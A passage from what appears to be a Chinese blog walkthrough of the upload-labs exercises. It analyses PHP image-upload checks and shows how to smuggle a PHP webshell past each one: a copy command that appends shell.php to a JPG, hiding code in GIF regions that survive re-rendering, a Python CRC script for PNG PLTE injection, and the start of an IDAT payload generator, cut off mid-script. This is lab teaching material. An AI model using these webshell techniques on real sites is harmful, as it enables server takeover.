class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRealFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = <span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);<br>    <span class="hljs-comment">//从二进制字符串对数据进行解包：</span><br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getRealFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码，将上传的文件先读取两字节，通过对比文件头来确认文件类型。<br>于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。</p><p>绕过方法</p><p>利用windows的cmd命令制作copy制作图片马<code>copy 1.jpg /b + shell.php /a shell.jpg</code>，制作完图片马后直接上传，然后利用文件包含即可。</p><p><a href="https://www.runoob.com/php/func-misc-unpack.html">unpack 函数参考</a></p><h1 id="图片马-getimagesize"><a href="#图片马-getimagesize" class="headerlink" title="图片马 getimagesize()"></a>图片马 getimagesize()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize() 函数解释</a></p><blockquote><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p></blockquote><p>绕过方法与 unpack 一致</p><h1 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.exif-imagetype.php">exif_imagetype 函数说明</a></p><blockquote><p><strong>exif_imagetype()</strong> 读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回 <strong><code>FALSE</code></strong></p></blockquote><p>绕过方法同生成图片马</p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p>参考：<a href="https://xz.aliyun.com/t/2657">这篇文章</a> 讲的很细</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先是判断 Content-Type，然后再用<code>imagecreatefrom[gif|png|jpg]</code>函数判断是否是图片格式，如果是图片的话再用<code>image[gif|png|jpg]</code>函数对其进行二次渲染。</p><p>我们可以上传一个正常的图片文件，观察其上传前和上传后图片的二进制流是否发生变化，比如我用copy命令生成了shell.jpg，用十六进制编辑器打开可以看到文件末尾有我们加入的php语句，将其上传，将服务器保存的即被二次渲染过的图片保存下来。将被二次渲染过的图片用十六进制编辑器打开，可以看到图片的大小大幅减小，且前面加入的PHP代码也不见了。</p><p>绕过方法</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>gif二次渲染绕过说是最简单的。将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。用UE的比较功能，可以迅速找到两者匹配的地方。在匹配处写入php代码即可。</p><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><p>png的文件组成参考 <a href="https://www.52hertz.tech/2019/11/14/png%E6%96%87%E4%BB%B6%E7%BB%84%E6%88%90">另一篇博客</a>，也是通过参考文章整理出来的。</p><h3 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h3><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p><p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p><ol><li><p>在PLTE数据块写入php代码.</p><p><img src="https://s2.ax1x.com/2020/02/09/1WObmF.png" alt="1WObmF.png"></p></li><li><p>计算PLTE数据块的CRC，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> re<br><br>png = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;2.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>a = png.read()<br>png.close()<br>hexstr = binascii.b2a_hex(a)<br><br><span class="hljs-string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br>data =  <span class="hljs-string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="hljs-string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="hljs-number">0</span>]<br>crc = binascii.crc32(data[:-<span class="hljs-number">16</span>].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(crc)<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">526579b0</span><br></code></pre></td></tr></table></figure></li><li><p>修改CRC值</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOqw4.png" alt="1WOqw4.png"></p></li><li><p>验证</p><p>将修改后的png图片上传后,下载到本地打开</p><p><img src="https://s2.ax1x.com/2020/02/09/1WOXk9.png" alt="1WOXk9.png"></p></li></ol><h3 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h3><p>国外大牛写的脚本，直接拿来运行即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span 